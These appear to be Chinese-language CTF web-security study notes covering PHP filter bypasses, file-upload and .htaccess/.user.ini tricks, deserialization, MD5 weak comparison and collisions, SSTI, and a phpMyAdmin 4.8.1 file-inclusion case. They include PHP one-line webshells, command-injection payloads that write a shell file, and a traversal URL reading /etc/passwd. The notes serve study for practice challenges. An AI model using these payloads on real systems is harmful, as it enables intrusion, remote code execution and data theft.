# web

## php在线网站

[PHP 在线工具 | 菜鸟工具 (jyshare.com)](https://www.jyshare.com/compile/1/)

## php函数

### die()和exit()

在PHP中，`die()`函数是`exit()`函数的别名，用于输出一条消息（如果提供）并终止当前脚本的执行。这个函数常被用于处理错误情况，当脚本遇到一个无法恢复的错误或者达到了不应继续执行的逻辑点时，可以使用`die()`来立即停止程序运行。

### preg_match()

此函数用来检查变量中是否包含指定模式,有以下两种常见用法:

`preg_match("/[\'\"\\\\\(\)\[\]\{\}\/]/", $ip, $match)`

两个`/`时正则表达式的定界符,如果包含特殊字符,则返回1

`preg_match("/.*f.*l.*a.*g.*/", $ip)`

- `/`：正则表达式的开始和结束定界符。
- `.*`：`.`匹配除换行符之外的任意单个字符，`*`表示前面的元素可以出现零次或多次。因此，`.*`连在一起就表示“任意数量的任意字符”。
- `f`、`l`、`a`、`g`：需要按顺序出现的字符。
- `.*`：在每个字符之间以及最后一个字符之后，再次使用，表示这些字符之间可以有任意数量的其他字符。

这段代码检查变量`$ip`是否包含由任意字符分割的字母序列'f','l','a','g'.



**绕过方法**:

1.`preg_match`只能匹配第一行，所以这里可以采用多行绕过。

使用get方式提交类似payload:

`{%0a"cmd":"ls /"%0a}`即可绕过对`/`的匹配

2.回溯

具体脚本:

```
import requests

payload = '{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a" * (1000000) + '"}'

res = requests.post("http://5881937a-a9b5-4d44-84f2-844ed296aecd.node5.buuoj.cn:81/", data={"cmd": payload})
print(res.text)

```

原理:

利用post提交超长payload绕过匹配





### isset($_GET['key'])

`isset($_GET['key'])` 是用于检查 `$_GET` 超全局数组中是否存在名为 'key' 的键的函数。

### var_dump(),print(),print_r()输出 函数

print_r相较于print而言输出数组更方便

例如:

`url/calc.php?    num=print_r(scandir(chr(47)));`

//print_r和print的区别：print_r打印数组好使，你们先用print试试就知道了，我用了之后才改的

//scandir()就是检索的意思

//chr(47)是就是“/”因为脚本过滤了，就得改成这个

### file_get_contents()

读取本地文件.

语法file_get_contents(filepath)

实例:

`file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))`

其中`.`是连接符



## 修改http请求头部

1.用hackbar,点击**ADD HEADER**,添加头部

2.用burp,选择代理,打开内置浏览器,在raw里进行更改

## 路径中“./”、“../”、“/”代表的含义

**"./"：代表目前所在的目录。**

**" . ./"代表上一层目录。**

**"/"：代表根目录。**

## ping命令

### unix-like系统(linux 和 macOS)

- `ping 127.0.0.1`：这个命令会向本机的回环地址发送 ICMP 回声请求。127.0.0.1 是一个特殊的 IP 地址，指向本机，用于网络软件测试。在 Unix-like 系统中，默认情况下，`ping` 命令会持续运行直到被中断（通常通过按 Ctrl+C）。

- `&&`：这个符号用于串联命令，只有当前面的命令（`ping 127.0.0.1`）成功执行后，后面的命令（`ls`）才会被执行。但由于 `ping` 默认会无限运行，除非你手动停止它（使其“成功”），否则 `ls` 命令不会执行。

`ping -c 4 127.0.0.1 && ls`

这里 `-c 4` 选项告诉 `ping` 只发送 4 个请求，然后停止。这样，一旦 `ping` 命令完成，`ls` 命令就会执行，列出当前目录的内容。

### windows

Windows 的 `ping` 命令默认发送 4 个 ICMP 回声请求，然后停止，所以原始命令 `ping 127.0.0.1 && ls` 中的 `ping` 部分在 Windows 上会按预期工作。然而，Windows 使用 `dir` 命令来列出目录内容，而不是 `ls`（这是 Unix-like 系统的命令）。



**当&被绕过时,可以使用;**



## 绕过空格

1. 
	`< `
2. `<> `
3.  
4. `IFS`
5. `{IFS}`
6. `${IFS}`
7. `${IFS}$9`
8. `$IFS`
9. `$IFS$1`     //$1改成$加其他数字貌似都行



## xss绕过方法（前端绕过，拼凑绕过，注释干扰绕过，编码绕过）

[xss绕过方法（前端绕过，拼凑绕过，注释干扰绕过，编码绕过）_()绕过-CSDN博客](https://blog.csdn.net/qq_43814486/article/details/89843012)

[CTFWeb-命令执行漏洞过滤的绕过姿势_绕过空格过滤-CSDN博客](https://blog.csdn.net/weixin_39190897/article/details/116247765)



## 命令联合执行

| 连接词 | 释义                                                         |
| ------ | ------------------------------------------------------------ |
| `;`    | 前面的命令执行完以后，继续执行后面的命令                     |
| `|`    | 管道符，将上一条命令的输出作为下一条命令的参数（显示后面的执行结果） |
| `||`   | 当前面的命令执行出错时（为假）执行后面的命令                 |
| `&`    | 将任务置于后台执行                                           |
| `&&`   | 前面的语句为假则直接出错，后面的也不执行，前面只能为真       |



## error_reporting(0);

`error_reporting(0);` 是一个用于设置 PHP 错误报告级别的函数调用。具体来说，这行代码将错误报告级别设置为 0，即禁用所有错误报告。



## http请求头

### Referer
HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。Referer 常用在防盗链和防恶意请求中。

Referer是 HTTP请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含 Referer。比如我在www.sojson.com 里有一个www.baidu.com 链接，那么点击这个www.baidu.com ，它的header 信息里就有：

Referer=https://www.sojson.com

### User-Agent
中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及浏览器版本、浏览器渲染引擎、浏览器语言、浏览器插件等。一些网站常常通过判断 UA 来给不同的操作系统、不同的浏览器发送不同的页面，因此可能造成某些页面无法在某个浏览器中正常显示，但通过伪装 UA 可以绕过检测。

### X-Forwarded-For
X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。
当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。
如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。XFF的有效性依赖于代理服务器提供的连接原始IP地址的真实性，因此，XFF的有效使用应该保证代理服务器是可信的，比如可以通过创建可信服务器白名单的方式。

这一HTTP头一般格式如下:

X-Forwarded-For: client1, proxy1, proxy2, proxy3

其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。 在上面这个例子中，这个请求成功通过了三台代理服务器：proxy1, proxy2 及 proxy3。请求由client1发出，到达了proxy3(proxy3可能是请求的终点)。请求刚从client1中发出时，XFF是空的，请求被发往proxy1；通过proxy1的时候，client1被添加到XFF中，之后请求被发往proxy2;通过proxy2的时候，proxy1被添加到XFF中，之后请求被发往proxy3；通过proxy3时，proxy2被添加到XFF中，之后请求的的去向不明，如果proxy3不是请求终点，请求会被继续转发。

鉴于伪造这一字段非常容易，应该谨慎使用X-Forwarded-For字段。正常情况下XFF中最后一个IP地址是最后一个代理服务器的IP地址, 这通常是一个比较可靠的信息来源。


burpsuite拦截后没有可以自己加上请求头



**在改包时发现referer放在最后时页面请求失效,放在倒数第二行页面成功发送**



## 常见的web服务器

apache

Nginx

Nginx

Apache Tomcat

Lighttpd

IBM WebSphere服务器

网站使用哪种服务器可在burpsuite中查看



## 文件上传漏洞

`为什么<?php @eval(_POST["y"]); ?>可以替换成<?= @eval(_POST["y"]); ?>`

```
主要是因为在php中，

<?=

?>

等价为

<?php echo

?>
```



一句话木马:`<?php @eval($_POST['shell']); ?>`

`<script language="php">eval($_POST['shell']);</script>`



文件上传之后,除了用蚁剑连接,也可以使用函数来读取flag,具体步骤如下:

进入上传的文件的url,使用POST方式提交函数,例如:

`shell=phpinfo();`              #可以查看被禁用的函数

`shell=print_r(scandir('/'));`            #输出根目录下的文件

`shell=print_r(file_get_contents('/flag'));`        #输出根目录下flag内容

`shell=print_r(show_source('/flag'));`



### 常见的php后缀绕过

php2, php3, php4, php5, phps, pht, phtm, phtml

还可以在php后缀后面加`空格`和`.`



### 文件格式修改绕过

抓包之后把

Content-Type的值修改改为：`image/png`



### .htaccess文件和.user.ini文件

#### .htaccess

htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能.
也就是说如果目标服务器允许用户修改.htaccess文件我们就可以通过它改变文件拓展名或者访问功能来getshell
**局限:**只能再apache中使用

通过修改apache的.htaccess配置文件可以将其他类型的文件当作php文件来解析。

新建一个htaccess文件，写入



```
SetHandler application/x-httpd-php
```

或者:

`<FilesMatch "1.jpg">*//修改的文件，弱改为.jpg则会吧所有.jpg文件当作php文件解析。* `

`SetHandler application/x-httpd-php `

`</FilesMatch>`



#### .user.ini

\- (1)服务器脚本语言为PHP
\- (2)对应目录下面有可执行的php文件
\- (3)服务器使用CGI／FastCGI模式

.user.ini.它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。

.user.ini文件同样可以改变用户读取文件和包含文件的权限等，它的使用范围更广，但是条件多了一个(比较重要的)**对应目录下有可执行文件**。

配置:

auto_prepend_file=a.jpg     //第一种
auto_prepend_file=a.jpg    //在页面顶部加载文件
auto_append_file=a.jpg      //在页面底部加载文件

要先上传.user.ini,再上传🐎

上传成功后访问同一目录下的php文件既可包含我们上传的🐎



### 文件幻术头绕过

图像相关的信息检测常用getimagesize( )函数。每种类型的图片内容最开头会有一个标志性 的头部，这个头部被称为文件幻术。

jpg对于的前面的16进制字符是

`FFD8FFE000104A464946`

png对应的是

`89504E47`

gif对应的是

`474946383961`

也可以直接把16进制转成字符加在包的首部(base16编码)
比如说利用文件幻术头绕过进行上传.user.ini文件
`GIF89a`



## dirsearch工具(扫描网站文件)

python dirsearch.py -u http://xxxx        //日常使用

python dirsearch.py -u http://xxxx -r        //递归扫描，不过容易被检测

python dirsearch.py -u http://xxxx -r -t 30        //线程控制请求速率

python dirsearch.py -u http://xxxx -r -t 30 --proxy 127.0.0.1:8080        //使用代理
#可能一次扫不出来,可以多扫几次

**常见备份文件后缀名:**“.git” 、“.[svn](https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020)”、“ .swp” “.~”、“.bak”、“.bash_history”、“.bkf”、"zip"

## githack(拿到.git下面的文件)

进入githack文件目录所在的cmd

语法:

python githack.py url/.git

拿到的文件就在当前目录下



## 序列化和反序列化

### 序列化

`<?php `

`class peak{ `

`		public $name = "1stPeak"; `

`		protected $sex = "man"; `

`		private $age = "18"; `

`} `

`$a = new peak; `

`echo serialize($a); `

`?>`

序列化后的结果为：

`O:4:"peak":3:{s:4:"name";s:7:"1stPeak";s:6:"*sex";s:3:"man";s:9:"peakage";s:2:"18";}`

注:这里可能不理解序列化后的sex和age，这个是由访问控制修饰符导致的（访问修饰符的不同，序列化后的属性名的长度和属性名会有所不同）
例：

`public(公有)
protected(受保护)
private(私有)`
各访问修饰符序列化后的区别：
`public`：属性被序列化的时候属性名还是原来的属性名，没有任何改变
`protected`：属性被序列化的时候属性名会变成`%00*%00`属性名，长度跟随属性名长度而改变
`private`：属性被序列化的时候属性名会变成`%00类名%00`属性名，长度跟随属性名长度而改变

注：这里的`%00`也就是表示空字符，在url中用`%00`表示，在hex中表示`\x00`
Tip：`%00`和`\x00`也就是我们常说的00截断

**注意:**私有字段前面要加`%00`

**Tip：**
serialize()函数有个规定，在序列化对象时，如果对象存在有__sleep魔术方法，那么，在序列化对象时__sleep魔术方法会优先调用，然后再继续执行序列化操作

### 反序列化

反序列化，顾名思义，就是将序列化后的字符串还原
unserialize()也有和serialize()相对应的魔术方法__wakeup，反序列化时，会优先检查是否存在__wakeup魔术方法，如果存在，就会优先调用__wakeup方法

一般做CTF题目时绕过的方法就是：先序列化字符串，然后使序列化后字符串中属性的个数大于真实对象中属性的个数，即可绕过，例如XCTF的那道题：
题目为：

`class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=`

我们对其进行序列化：

结果为：`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`，然后将序列化后字符串中属性的个数由1改为2，大于真实属性个数1，即可绕过__wakeup

**注：**修改s(属性类型)或属性名长度也可绕过执行__wakeup，因为你构造的属性和真实的属性不符；但修改属性值是不会绕过__wakeup的，所以综述：只有改变属性个数、属性类型、属性名才可以绕过！



## 弱类型比较

在PHP中：
= = 为弱相等，即当整数和[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)类型相比较时。会先将字符串转化为整数然后再进行比较。比如a=123和b=123admin456进行= =比较时。则b只会截取前面的整数部分。即b转化成123。
所以，这里的a = = b是返回True。





## waf绕过

### url编码绕过

### php解析字符串特性

**PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：**

```php
1.删除前后的空白符（空格符，制表符，换行符等统称为空白符）
2.将某些字符转换为下划线（包括空格）
```

假如waf不允许num变量传递字母

那么我们可以**在num前加个空格**

**这样waf就找不到num这个变量了，因为现在的变量叫" num"，而不是"num"。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。**

### strcmp()绕过

`define('FLAG','pwnhub{this_is_flag}');
if(strcmp($_GET['flag'],FLAG) == 0){
     echo "success,flag:".FLAG;
}`

脚本意思是get到的flag和FLAG的值相等，就可以得到FLAG，但我们都不知道flag值是什么，利用strcmp函数特点尝试使用数组绕过。令flag[]=xxx。



### md5()绕过

**md5不能处理数组，如果是数组则会返回NULL**



- **string md5(&str, raw)**

raw 参数控制输出的「格式」：

true ：16个字符的「二进制格式」
false ：（默认）32个字符的十六进制格式

**绕过思路1：遇到弱比较（ md5(a)==md5(b) ）时，可以使用 0e绕过。**



实例：

```php
var_dump(md5(0e123) === md5(0e456));
```



**绕过思路2：遇到若比较（ md5(a)==0 ），可以传入QNKCDZO等绕过。**



 实例：

```php
echo md5('QNKCDZO').PHP_EOL;
var_dump(md5('QNKCDZO') == 0);
```



一些MD5值为0e开头的字符串：

QNKCDZO   => 0e830400451993494058024219903391
240610708 => 0e462097431906509019562988736854
s878926199a => 0e545993274517709034328855841020
s155964671a => 0e342768416822451524974117254469
s214587387a => 0e848240448830537924465865611904
s214587387a => 0e848240448830537924465865611904



**绕过思路：遇到强比较（a===b）时，可以使用数组绕过。GET传参时，以 a[]=1&b[]=2 这种形式传递数组。**

实例：

```php
$a = array(1,2,3);
$b = array(4,5,6);
var_dump(md5($a)===md5($b));
```



**注意:**`ffifdyop,这个MD5加密后会返回’or’6XXXXXXXXX(这里的XXXXX是一些乱码和不可见字符)`



### 绕过`$md5==md5($md5)`

`0e215962017` 的 MD5 值也是由 **0e** 开头，在 PHP 弱类型比较中相等



### md5强碰撞

在使用hackbar传参时会报错(可能是对%再次decode出错),要用burpsuite

原理是将hex字符串转化为ascii字符串，并写入到bin文件考虑到要将一些不可见字符传到服务器，这里使用url编码

md5强碰撞例子

psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2

与

psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2

还有

M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

与

M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2



### uniqid()绕过

uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。

**引用赋值：**PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。

`<?php
class BUU{
    public $correct = "";
    public $input = "";
}
$chen = new BUU();
$chen->input=&$chen->correct;
$chen = serialize($chen);
echo $chen."<br />";
//O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}`




### substr(),mid()绕过

##### Left()函数

Left()得到字符串左部指定个数的字符

- Left ( string, n ) string为要截取的字符串，n为长度。



##### ORD()函数

此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。

- ORD(MID(DATABASE(),1,1))>114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’



### cat绕过

- 使用less,more,tail,head等代替

- 反斜杠 ： 例如 ca\t fl\ag.php

- 连接符： 例如 ca’‘t fla’'g.txt

- 一句话木马
	构造payload如下：

	```bash
	127.0.0.1 &echo "<?php @eval(\$_POST['shell']);?>" >> 1.php
	```



### 空格绕过

以下都可以代替空格:

`<,<>,%20(space),%09(tab),$IFS$9, I F S , {IFS},IFS,IFS
`

`${IFS}`

`$IFS$1 //$1可改加成其他数字`
`%09`



### 过滤目录分隔符

`if (!preg_match_all("/\//", $ip, $m))`

使用cd命令切换当前目录







## session和cookie、token

[一文彻底搞清session、cookie、token的区别 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/631349844)

一般情况下,cookie存储在客户端,session存储在服务端.token都可以



## flask

使用python编写的轻量级web应用框架

对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中

Django默认将session存储在数据库



## nodeprep.prepare函数

nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a

unicode字符网站:https://unicode-table.com/en/1D2E/



## tornado render模板注入

render是一个类似模板的东西，可以使用不同的参数来访问网页
在tornado模板中，存在一些可以访问的快速对象，例如
`{{ handler.settings }}`

这两个{{}}和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象
handler 指向RequestHandler

而RequestHandler.settings又指向self.application.settings

所有handler.settings就指向RequestHandler.application.settings了！

大概就是说，这里面就是我们一下环境变量，我们正是从这里获取的cookie_secret



## file_get_contents() 函数

### 概述

在PHP中，[file_get_contents](https://so.csdn.net/so/search?q=file_get_contents&spm=1001.2101.3001.7020)() 函数是一个强大的工具，它既可以用于读取本地文件的内容，也可以用于发起 HTTP 请求获取远程资源。本文将详细介绍 file_get_contents() 函数的两种主要用途，并探讨如何充分利用这个函数。

### 读取本地文件

file_get_contents() 函数在文件操作中的主要作用是读取本地文件的内容。以下是一个简单的示例：

```php
$file_path = 'example.txt';
$content = file_get_contents($file_path);
```

file_get_contents() 还支持通过上下文选项（context）来进行更高级的文件读取操作。上下文选项可以用于设置代理、超时时间等参数，以满足特定的需求。

`$context = stream_context_create([`
`    'http' => [`
     `   'method' => 'GET',`
   `     'header' => 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'`
  `  ]`
`]);`

`$file_path = 'example.txt';`
`$content = file_get_contents($file_path, false, $context);`
在这个例子中，通过上下文选项设置了一个自定义的 User-Agent 头部信息，以模拟一个浏览器请求。这展示了如何使用上下文选项来进行更灵活的文件读取操作。

### HTTP请求

file_get_contents() 函数的另一个强大之处在于可以用于发起 HTTP 请求，获取远程资源的内容。以下是一个简单的 HTTP GET 请求的示例：

`$url = 'https://www.example.com';`
`$content = file_get_contents($url);`

这个例子中，file_get_contents() 函数会向 https://www.example.com 发送 HTTP GET 请求，并将获取到的内容存储在 $content 变量中。

此外,还可以处理`响应头信息`和`http错误`

### 绕过方法

#### php://input

此协议需要 allow_url_include 为 on，可以访问请求的原始数据的只读流, 将post请求中的数据作为 PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input ,同时post想设置的文件内容，php执行时会将post内容当作文件内容。

#### php://data

data://协议需要满足双on条件，作用和 php://input 类似

`?text=data:text/html,welcome to the zjctf`



## burp suite提交POST

1.把`GET`改成`POST`

2.增加`Content-Type: application/x-www-form-urlencoded`

3.**空一行**输入POST内容   #注意多余字符,比如换行符



## php魔术方法

php规定以两个下划线（__）开头的方法都保留为魔术方法

### __toString()方法

打印一个对象时，如果定义了__toString()方法，就能在测试时，通过echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。如果没有这个方法，那么echo一个对象时，就会报错Object of class Account could not be converted to string，实际上这是一个类型匹配失败的错误。

### __construct()

- 触发时机：在对象实例化（创建对象）的时候自动触发
- 作用：初始化成员属性
- 参数：可以有，可以没有，取决于设定与逻辑
- 返回值：没有
- 注意：如果构造方法具有参数，且参数没有默认值，在[实例化对象](https://so.csdn.net/so/search?q=实例化对象&spm=1001.2101.3001.7020)时，必须在类名后面的括号内添加实参

### __desctruct()——析构方法

__desctruct()析构函数，不需要显示的调用，系统会自动调用这个方法。而且析构函数不需要参数（因为不需要调用）

触发时机：在销毁对象的时候自动触发（unset() 或者 页面执行完毕）

作用：回收对象使用过程中的资源，配合 unset 使用

参数：没有

返回值：没有


### 魔术方法： __get(访问后门)

- 触发时机：访问私有成员属性的时候自动触发
- 功能：1. 防止报错 2. 为私有成员属性访问提供后门
- 参数：一个 访问私有成员属性名称
- 返回值：可以有，可以没有，实际情况决定
- 注意：__get 函数只能进行查看无法进行修改。

### 魔术方法: __set()

- 出发时机：对私有成员属性进行设置值时自动触发

	​					或者属性值不存在

- 功能：1. 屏蔽错误 2. 为私有成员属性设置提供后门

- 参数：两个 $a 私有成员属性的原值 $b 私有成员属性的新值

- 返回值：没有返回值

### 魔术方法：__isset

- 触发时机：对私有成员属性进行 isset 进行检查时自动触发
- 功能：代替对象外部的 isset函数检测，返回结果
- 参数：1个 ，私有成员属性名
- 返回值：一般返回 isset()检查结果



### 魔术方法：__unset

- 触发时机：对私有成员属性进行 unset 进行检查时自动触发
- 功能：代替对象外部的 unset函数检测，
- 参数：1个 ，私有成员属性名
- 返回值：无



### 魔术方法：__wakeup

- 触发时机:在反序列化时触发

绕过方法:绕过wakeup函数只要反序列化时对象参数大于原参数数量即可绕过

//O:4:"xctf":1:{s:4:"flag";s:3:"111";} 

修改成下面 

//O:4:"xctf":2:{s:4:"flag";s:3:"111";} 



### 魔术方法: __invoke

__invoke()：当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。





## 关于WEB-INF目录及Tomcat部署方式、原理的简单理解

### WEB-INF简介:

**WEB-INF 是 Java 的 web 应用的安全目录**。所谓安全就是客户端无法访问，只有服务端可以访问的目录。也就是说，这个目录是给服务端看的，那么，如果想要在客户端进行访问的话，就必须通过 web.xml 文件或是采用注解的方式对要访问的文件进行映射。

并且整个 web 应用程序的目录结构应该合理，文件应该放置在正确的位置，否则可能会出现 “404无法访问” 的问题。


### WEB-INF的作用

**/WEB-INF/web.xml**
Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。

**/WEB-INF/classes/**
包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。

**/WEB-INF/lib/**
存放web应用需要的各种JAR文件，放置*仅在这个应用中要求使用的jar文件,*如数据库驱动jar文件。
**/WEB-INF/src/**
 源码目录，按照包名结构放置各个 Java 文件。
 **/WEB-INF/database.properties**
 数据库配置文件
 **/WEB-INF/tags/**
存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：<%@ taglibprefix="tags" tagdir="/WEB-INF /simpleTags" % >。
**/WEB-INF/jsp/**
jsp 文件的存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。

**WEB-INF/jsp2**

存放jsp2.0以下版本的文件。

**META-INF**

相当于一个信息包。



## SSTI(模板注入)

### 模板引擎

模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。

模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。

### SSTI

SSTI 就是服务器端模板注入（Server-Side Template Injection）

当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。

**重点:**漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。

凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。



## 绕过(file_get_contents($text,'r')===

`if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))`

file_get_contents($text,'r')是读取文件的内容，说明我们首先要上传一个文件，并且它的内容还得是"welcome to the zjctf"，我们考虑用data协议，data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：

`data:text/plain,welcome to the zjctf`



## escapshellarg()和escapshellcmd()

函数escapeshellarg的作用是把字符串[转码](https://so.csdn.net/so/search?q=转码&spm=1001.2101.3001.7020)为可以在 shell 命令里使用的参数，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。

函数escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义(即在前面插入`\`)。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。

正确的样式：

`正确的样式：`

` ' <?php @eval($_POST["mayi"]);?> -oG mayi.php ' ` 

`$host = escapeshellarg($host); `

`>>> ''\'' <?php @eval($_POST["mayi"]);?> -oG mayi.php' \''' $host = escapeshellcmd($host); `

`>>> ''\'' \<\?php @eval($_POST["mayi"])\;\?\> -oG mayi.php' \\''' `

`# 等价于  \<\?php @eval($_POST["mayi"])\;\?\> -oG mayi.php \\`



## phpMyAdmin 4.8.1 远程文件包含

### 一、漏洞描述
phpMyAdmin 是一套开源的、基于Web的MySQL数据库管理工具。在 4.8.2 之前的 phpMyAdmin 4.8.x 中发现了一个问题，其中攻击者可以在服务器上包含文件。该漏洞来自 phpMyAdmin 中重定向和加载页面的部分代码，以及对白名单页面的不当测试。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。

攻击者必须经过身份验证，以下情况除外：
`$cfg['AllowArbitraryServer'] = true`：攻击者可以指定已经控制的任何主机，并在 phpMyAdmin 上执行任意代码；
`$cfg['ServerDefault'] = 0`：这绕过登录并在没有任何身份验证的情况下运行易受攻击的代码。

### 二、漏洞影响

4.8.0 <= phpMyAdmin < 4.8.2



### 三、漏洞实例

buuctf 我有一个数据库

访问`http://x.x.x.x:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd`，可见`/etc/passwd`被读取，说明文件包含漏洞存在：

